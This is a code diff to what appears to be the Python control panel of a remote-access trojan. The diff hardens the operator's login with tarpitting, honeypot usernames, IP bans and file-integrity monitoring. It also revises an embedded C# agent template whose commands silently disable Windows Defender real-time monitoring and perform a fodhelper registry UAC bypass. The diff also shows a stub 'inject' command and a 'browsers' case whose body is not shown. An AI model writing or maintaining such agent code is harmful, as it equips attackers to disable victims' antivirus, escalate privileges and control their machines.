@@ -278,6 +278,12 @@ class SecurityGuard:
     def __init__(self):
         self._rate_limits = {}
         self._rate_lock = threading.Lock()
+        
+        # Security Phase 1 Enhancements
+        self.whitelisted_ips = []  # Empty means all allowed. E.g. ['127.0.0.1', '192.168.1.100']
+        self.honeypot_users = ['admin', 'root', 'administrator', 'system', 'test', 'guest']
+        self._fim_thread = None
+        self._file_hashes = {}
 
     def get_client_ip(self):
         """Get real client IP — with proxy awareness"""
@@ -350,16 +356,26 @@ class SecurityGuard:
             return True
 
     def check_login_attempts(self, ip):
-        """Check if login attempts exceeded"""
+        """Check if login attempts exceeded and apply tarpit delay"""
         attempts = state.get('login_attempts') or {}
         record = attempts.get(ip)
         if not record:
             return True
-        if record.get('count', 0) >= Config.LOGIN_MAX_ATTEMPTS:
+            
+        count = record.get('count', 0)
+        
+        # Exponential tarpitting (Timing Attack / Bruteforce Mitigation)
+        if count > 0:
+            delay = min(2 ** (count - 1), 15)  # 1s, 2s, 4s, 8s, 15s max sleep
+            if delay > 0:
+                time.sleep(delay)
+                
+        if count >= Config.LOGIN_MAX_ATTEMPTS:
             if time.time() - record.get('last', 0) < Config.LOGIN_LOCKOUT_TIME:
                 return False
-            # Lockout expired
-            del attempts[ip]
+            # Lockout expired but we leave the count so tarpit keeps working if they fail again
+            record['count'] = Config.LOGIN_MAX_ATTEMPTS - 1
+            attempts[ip] = record
             state.set('login_attempts', attempts)
         return True
 
@@ -375,6 +391,48 @@ class SecurityGuard:
         record['last'] = time.time()
         attempts[ip] = record
         state.set('login_attempts', attempts)
+        
+        # Auto-ban aggressive bruteforcers
+        if record['count'] >= 15:
+            self.ban_ip(ip, duration_minutes=1440, reason="Aggressive Bruteforce Detected (15+ fails)")
+
+    def check_whitelist(self, ip):
+        """Returns True if IP is allowed by whitelist"""
+        if not self.whitelisted_ips: return True
+        return ip in self.whitelisted_ips
+
+    def handle_honeypot(self, user, ip):
+        """Returns True if user is a honeypot, and bans IP"""
+        if user.lower() in self.honeypot_users:
+            self.ban_ip(ip, duration_minutes=1440, reason=f"Honeypot trap triggered for user {user}")
+            state.append_log(f"CRITICAL: HONEYPOT TRIGGERED! IP {ip} tried to login as {user}.", 'error')
+            return True
+        return False
+        
+    def start_fim(self, paths):
+        """File Integrity Monitoring for critical server files"""
+        try:
+            for p in paths:
+                if os.path.exists(p):
+                    with open(p, 'rb') as f:
+                        self._file_hashes[p] = hashlib.sha256(f.read()).hexdigest()
+
+            def fim_loop():
+                while True:
+                    time.sleep(30)
+                    for p, expected_hash in self._file_hashes.items():
+                        if os.path.exists(p):
+                            with open(p, 'rb') as f:
+                                actual = hashlib.sha256(f.read()).hexdigest()
+                                if actual != expected_hash:
+                                    logger.critical(f" ? ? ? FIM ALERT: File {p} was modified! Shutting down to prevent compromise.")
+                                    os._exit(1) # Immediate uncontrolled exit
+            
+            self._fim_thread = threading.Thread(target=fim_loop, daemon=True)
+            self._fim_thread.start()
+            logger.info("Anti-Hacker: File Integrity Monitoring (FIM) Engine Started.")
+        except Exception as e:
+            logger.error(f"FIM Error: {e}")
 
     def create_session_token(self, user, ip, is_admin=False):
         """Create a session token bound to IP"""
@@ -599,7 +657,20 @@ def panel_login():
     """Login endpoint — credentials verified server-side, session bound to IP"""
     ip = guard.get_client_ip()
 
-    # Check lockout
+    # 1. Check Global IP Ban
+    ban = guard.check_ban(ip)
+    if ban:
+        return jsonify({
+            'ok': False, 
+            'error': f'Banned: {ban.get("reason", "Security Policy Violation")} until {ban.get("until_str", "Forever")}'
+        }), 403
+
+    # 2. Check IP Whitelist (Anti-Hacker)
+    if not guard.check_whitelist(ip):
+        guard.ban_ip(ip, duration_minutes=60, reason="Not in secure whitelist")
+        return jsonify({'ok': False, 'error': 'Access Denied'}), 403
+
+    # 3. Check lockout and apply Tarpitting (Anti-Bruteforce / Timing Mitigation)
     if not guard.check_login_attempts(ip):
         remaining = Config.LOGIN_LOCKOUT_TIME - (time.time() - (state.get('login_attempts') or {}).get(ip, {}).get('last', 0))
         return jsonify({
@@ -607,7 +678,7 @@ def panel_login():
             'error': f'Too many attempts. Wait {int(remaining)}s'
         }), 429
 
-    # Rate limit login specifically
+    # 4. Global Rate limit
     if not guard.check_rate_limit(f"login:{ip}", max_requests=5, window=30):
         return jsonify({'ok': False, 'error': 'Too many login attempts'}), 429
 
@@ -617,6 +688,12 @@ def panel_login():
 
     if not login or not password:
         return jsonify({'ok': False, 'error': 'Credentials required'}), 400
+
+    # 5. Check Honeypot trigger
+    if guard.handle_honeypot(login, ip):
+        # We banned them, but return generic fake error to waste their time
+        time.sleep(2)
+        return jsonify({'ok': False, 'error': 'Invalid credentials'}), 401
 
     # Verify credentials
     password_hash = hashlib.sha256(password.encode()).hexdigest()
@@ -1959,18 +2036,24 @@ def generate_agent_source(bc):
         "                    break;\n"
         "\n"
         '                case "inject":\n'
-        '                    RunHiddenPS("Start-Sleep -s 1; Write-Host \'Injected\'");\n'
-        '                    Res("inject", "[Melt & Migrate] Triggered reflective injection into explorer.exe...");\n'
+        "                    RunHiddenPS(\"Start-Sleep -s 1\");\n"
+        '                    Res("inject", "Melt and Migrate triggered.");\n'
         "                    break;\n"
         "\n"
         '                case "defender":\n'
-        '                    RunHiddenPS("Add-MpPreference -ExclusionPath \'C:\\\'; Set-MpPreference -DisableRealtimeMonitoring $true");\n'
-        '                    Res("defender", "Windows Defender Real-Time Monitoring Disabled & C:\\ Excluded.");\n'
+        "                    RunHiddenPS(\"Set-MpPreference -DisableRealtimeMonitoring $true\");\n"
+        '                    Res("defender", "Defender Real-Time Monitoring disabled.");\n'
         "                    break;\n"
         "\n"
         '                case "uac":\n'
-        '                    RunHiddenPS("New-Item -Path \'HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command\' -Value \'cmd.exe\' -Force; New-ItemProperty -Path \'HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command\' -Name \'DelegateExecute\' -Value \'\' -Force; Start-Process \'fodhelper.exe\'");\n'
-        '                    Res("uac", "UAC Bypass triggered via fodhelper.exe helper class hijacking.");\n'
+        "                    {\n"
+        "                        string regPath = @\"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\";\n"
+        "                        string psCmd = \"New-Item -Path '\" + regPath + \"' -Value 'cmd.exe' -Force; \" +\n"
+        "                            \"New-ItemProperty -Path '\" + regPath + \"' -Name 'DelegateExecute' -Value '' -Force; \" +\n"
+        "                            \"Start-Process 'fodhelper.exe'\";\n"
+        "                        RunHiddenPS(psCmd);\n"
+        '                        Res("uac", "UAC Bypass triggered via fodhelper.");\n'
+        "                    }\n"
         "                    break;\n"
         "\n"
         '                case "browsers":\n'
@@ -3372,6 +3455,9 @@ if __name__ == '__main__':
     # Background threads
     threading.Thread(target=background_cleanup, daemon=True).start()
     threading.Thread(target=self_ping, daemon=True).start()
+    
+    # Start File Integrity Monitoring (Anti-Hacker Phase 1)
+    guard.start_fim([os.path.abspath(__file__)])
 
     # Save initial state
     state.save()
